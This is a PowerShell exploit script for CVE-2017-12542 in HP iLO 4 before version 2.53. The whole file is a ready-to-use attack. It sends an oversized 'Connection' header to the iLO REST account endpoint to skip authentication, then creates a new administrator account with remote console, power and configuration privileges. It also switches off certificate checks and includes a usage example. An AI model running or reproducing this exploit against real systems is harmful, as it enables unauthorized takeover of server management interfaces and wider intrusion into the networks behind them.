#Requires -Version 5.1

<#
    easyiLO.ps1
    
    CVE-2017-12542 exploit in PowerShell:
    creates a new iLO administrative user without authentication.

    Works with HP iLO 4 < 2.53

    Usage example:

    easyiLO.ps1 https://10.0.0.3 newadmin newpassword

    It requires PowerShell 5.1 or later.

    author: Marco Bellaccini - marco.bellaccini[at!]gmail.com
    license: Creative Commons CC0
    https://creativecommons.org/publicdomain/zero/1.0/
#>

param(
  [Parameter(Mandatory=$true)]
  [string]$url,
  [Parameter(Mandatory=$true)]
  [string]$adminname,
  [Parameter(Mandatory=$true)]
  [string]$adminpass
)

# super-plane-powers!
$headers = @{
    'Connection' = 'A'*29
}

$body = @{
	'UserName' = $adminname
	'Password' = $adminpass
	'Oem' = @{
	    'Hp' = @{
		    'LoginName' = $adminname
		    'Privileges'= @{
	                'LoginPriv' = $true
	                'RemoteConsolePriv'= $true
	                'UserConfigPriv' = $true
	                'VirtualMediaPriv'= $true
	                'iLOConfigPriv'= $true
	                'VirtualPowerAndResetPriv'= $true
                    }
	    }
    }
} | ConvertTo-Json -Depth 5 # default depth was not enough

$rurl = $url.trim('/') + '/rest/v1/AccountService/Accounts'

# ignore invalid certs
[System.Net.ServicePointManager]::ServerCertificateValidationCallback = { $true }

try {
    $retjson = Invoke-RestMethod -Method 'Post' -Uri $rurl -Body $body -ContentType 'application/json' -Headers $headers
} catch {
    Write-Host "Sorry... It didn't work."
    Write-Host "Server returned this:"
    Write-Host "  StatusCode:" $_.Exception.Response.StatusCode.value__ 
    Write-Host "  StatusDescription:" $_.Exception.Response.StatusDescription
    exit
}

Write-Host "Success! You can now log-in using the credentials you provided."
